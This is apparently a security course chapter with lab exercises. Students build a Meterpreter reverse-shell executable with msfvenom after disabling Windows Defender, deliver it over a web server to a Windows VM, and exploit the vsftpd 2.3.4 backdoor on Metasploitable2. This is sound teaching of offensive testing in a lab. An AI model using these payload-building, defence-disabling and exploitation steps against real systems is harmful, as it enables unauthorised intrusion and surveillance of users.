# Security Testing
Image

Intro

**Objective**
1. lol

## Security Testing Fundamentals
### Security Testing Types

### Scope
Inhouse/3rd Party
Network/Web
Internal/External
Authenticated/Anon

### Frameworks
>[!activity] Activity 10.1 - Metasploit Basics

## Command and Control
Basic Infrastructure
Resilient Infrastructure
Agents

## Remote Connections
Shell
>[!activity] Activity 10.2 - SSH

Hardened Network
Reverse Shell
> [!activity] Activity 10.3 - Reverse Shell


## Red Team Process
Reconnaissance
Enumeration
Exploitation/Initial Access
Post Exploitation

>[!activity] Activity 10.4 - Metasploitable2

Reporting

## Exercises
>[!exercise] Exercise 10.1 - SSH
>In this task you will connect to the Ubuntu VM from the Kali VM over SSH.
>#### Step 1 - SSH Server Setup
>Start your Ubuntu VM using the Bridge Adapter network mode and launch a terminal.  Run socket statistics and observe there are no TCP sockets including port 22.
>```bash
>ss -antp
>```
>Install Open SSH on the Ubuntu VM.
>```bash
>sudo apt install openssh-server -y
>```
>Start the SSH daemon using systemctl. Once started, verify it is up and running also using systemctl.
>```bash
>sudo systemctl start ssh 
>systemctl status ssh
>```
>Use socket statistics to confirm the port 22 socket.  Check the Ubuntu VM IP address to be used to make an SSH connection from the Kali VM.
>```bash
>ip a
>```
>#### Step 2 - Establish SSH Connection
>Launch your Kali VM with Bridge Adapter network settings and launch a terminal.  Establish an SSH connection with the Ubuntu VM using the SSH client pre-installed on Kali. Make sure to replace the USER with your Ubuntu VM user and the IP with the IP address of your Ubuntu VM. Because we are using sudo with a low privilege user, enter your Kali VM user password. Type "yes" when prompted to add the Ubuntu VM IP to the known hosts. Lastly,  enter your Ubuntu VM user password when prompted.
>```bash
>sudo ssh USER@IP
>```
>After entering the Ubuntu VM password, you will be logged in and presented with the Welcome terminal message and a shell from the Kali VM.  Run `whoami` and `uname` to evidence you can run commands as the Ubuntu user on the Ubuntu VM from the Kali VM.
>```bash
>whoami
>uname -a
>```

> [!exercise] Exercise 10.2 - Reverse Shell
> In this task you will simulate a user's downloading and running of malware on the Windows VM which makes a reverse shell connection to Metasploit running on the Kali VM.
> #### Step 1 - Prepare Windows
> Launch the Windows VM in Bridge Adapter network mode and start the "Virus & threat protection" program.  With Windows Security running, select "Manage settings" under the "Virus & threat protection settings".  Turn Off the "Real-time protection", "Cloud-delivered protection", "Automatic sample submission", and "Tamper Protection" settings accepting any UAC prompts.
> #### Step 2 - Prepare Payload
> Launch your Kali VM with Bridge Adapter network setting and launch a terminal.  Check the IP address of the Kali VM.
> ```bash
> ip a
> ```
> Create an msfvenom executable file using the Kali VM's IP address as the LHOST and port 9001 as the LPORT. Use the Windows x64 staged TCP payload and output the file named runme.exe. Make sure to replace the KALI_IP with the IP address of your Kali VM.
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=9001 -f exe -o runme.exe
> ```
> #### Step 3 - Start a Web Server
> On the Kali VM, where the runme.exe file was created, start a Python webserver. Observe the webserver is standing by waiting for connections.
> ```bash
> sudo python3 -m http.server 80
> ```
> #### Step 4 - Start Meterpreter Listener
> In a new terminal on the Kali VM, start Metasploit. Note your banner message may be different.
> ```bash
> sudo msfdb run
> ```
> Navigate to the exploit multi-handler module.
> ```
> use exploit/multi/handler
> ```
> Configure the handler with the Kali VM IP address as the LHOST and port 9001 as the LPORT. Make sure to use your Kali VM IP address in place of KALI_IP.
> ```
> set LHOST KALI_IP
> set LPORT 9001
> ```
> Set the payload of the handler to the Windows x64 staged Meterpreter TCP setting we used when generating the EXE using Msfvenom.  Double check the settings and confirm the payload, LHOST, and LPORT are correct.
> ```
> options
> ```
> Start the listener. This will create a service waiting for a connection from the Meterpreter payload generated using Msfvenom.
> ```
> run
> ```
> #### Step 5 - Trigger the Attack
> The Kali VM has a Meterpreter listener on port 9001 and a webserver running on port 80. Return to the Windows VM and open a web browser. We will simulate a victim user downloading and running a malicious file from the internet. Navigate to the Kali VM's IP address and observe a listing of folders and files.
> 
> Find the "runme.exe" file in the directory listing for the Kali VM and press it to download. Edge will likely stop the download since it is an executable. Click on the toast message and select Keep from the options menu. Next SmartScreen will complain that the file isn't verified - select Show more and choose "Keep anyway". Finally, the executable downloads!
> 
> Open the Downloads folder and double-click the "runme.exe" file to launch it. SmartScreen blocks the file from running because it has the "mark of the web" setting. Select "More info" and then "Run anyway". Observe after a few seconds the Windows VM behaves normally while runme runs in the background.
> #### 6 - Profit!
> Now that the "runme.exe" ran on the Windows VM, return to the Kali VM's terminal that has the Metasploit handler/listener running. Observe that a stage was sent to the victim and a Meterpreter session was opened!
> 
> The Meterpreter shell acts like a wrapper to the Windows command line. The Meterpreter shell has many features such as download/upload, screen/keyboard recording, and much more. Type the help command to list all available features.
> ```
> help
> ```
> Explore the victim's system information using the built-in tool sysinfo. Observe the Windows system information is returned.
> ```
> sysinfo
> ```
> If your session dies, rerun the handler and re-execute the runme.exe on the victim to reestablish a connection. Using the help menu, identify a command that looks interesting and run it. Describe the command and if you were successful running it.

>[!exercise] Exercise 10.3 - Metasploitable2
>In this task you will set up a local docker container running Metasploitable2 and perform a penetration test against it. This black box scope starts at the enumeration through exploitation phases - reconnaissance and post exploitation phases are not required.
>#### Step 1 - Setup Metasploitable2
>Launch your Kali VM using the NAT network mode and start a terminal. Update your system.  Install docker which will be used to run a Metasploitable2 container.
>```bash
>sudo apt update -y
>sudo apt install -y docker.io
>```
>Add your Kali VM user to the docker group to avoid having to run as root. Afterwards, reboot your Kali VM so the permission settings take effect.
>```bash
>sudo usermod -aG docker $USER
>```
>With your Kali VM rebooted, run the Metasploitable2 docker image as name "metasploitable2", which will cause it to download automatically and start the services. The "&" ampersand at the end of the command makes the command run in the background of the terminal. Please allow a couple minutes for the container to download, run, and start services.
>```bash
>docker run -it --name "metasploitable2" tleemcjr/metasploitable2 sh -c "bin/services.sh && bash" &
>```
>Confirm the Metasploitable2 container is running. Observe the status is "Up".
>```bash
>docker container ls
>```
>#### Step 2 - Host Discovery
>The Metasploitable2 container is our target victim that is running off our Kali VM's virtual docker interface. Identify the docker virtual interface network using the ip command. Observe the docker0 interface with the network 172.17.0.1/16
>```bash
>ip a
>```
>Perform a ping sweep to discover all hosts running on the docker0 network. Make sure to replace the network CIDR range if yours is different. Within a few seconds the ping sweep discovers a host on 172.17.0.2 (yours may be different). Once the host is discovered, press CTRL+C to stop the scan. Otherwise, you'll have to wait several minutes for the scan to complete this /16 network.
>```bash
>sudo nmap -sn 172.17.0.1/16
>```
>#### Step 3 - Service Discovery
>Perform a TCP port and service scan against the identified target. Make sure to replace the IP with the identified metasploitable2 container IP discovered in the previous sub-step. Allow a few minutes for the scan to complete.
>```bash
>sudo nmap -sT -sV IP
>```
>Observe the target has several services open and that NMAP discovered versions of some of the identified services.
>#### Step 4 - Exploitation
>The NMAP service and version discovery yielded several results. One result of particular interest is port 21 FTP service using vsftpd on version 2.3.4. Start Metasploit on your Kali VM - your ASCII art may vary.
>```bash
>sudo msfdb run
>```
>With Metasploit running, search for vsftpd exploits. Observe that Metasploit has an exploit for VSFTPD version 2.3.4 which matches Metasploitable2's running version!
>```
>search vsftpd
>```
>Select the vsftpd_234_backdoor exploit in Metasploit.
>```
>use exploit/unix/ftp/vsftpd_234_backdoor
>```
>Explore the required configurations needed with the options command.
>```
>options
>```
>Configure the RHOSTS (remote) option with the IP address of the metasploitable2 container. Make sure to replace VICTIM_IP with the IP address of metasploitable2.
>```
>set RHOSTS VICTIM_IP
>```
>After RHOSTS is set, run the exploit. The first time the exploit ran it failed. Rerunning it worked better a second time. Sometimes exploits can be a little finicky!
>```
>run
>```
>After the exploit runs the cursor is on a blank line. Run OS commands to confirm the reverse shell is working.
>```bash
>whoami
>uname -a
>ip a
>```
>If needed, run sessions and sessions # to identify and use a running session.
>```
>sessions
>sessions 1
>```
>If you are in the shell, and want to return to Metasploit, run the background command and "y".
>```
>background
>```

>[!exercise] Exercise 10.4 - Penetration Test
>In this task, you will build on your penetration test from the previous task.  You MUST find two additional vulnerabilities and attempt to exploit them.  Regardless of success, you must document the VSFTPD vulnerabilities AND the two vulnerabilities you identify in a penetration report.  You may use any general format for the report, but it MUST include a background, summary, and findings sections.  Each finding in the report MUST include a description, severity/impact, proof of concept/demonstration, and remediation recommendations.  Consider referencing a sample from [https://github.com/juliocesarfort/public-pentesting-reports](https://github.com/juliocesarfort/public-pentesting-reports) to guide the format of your professional report.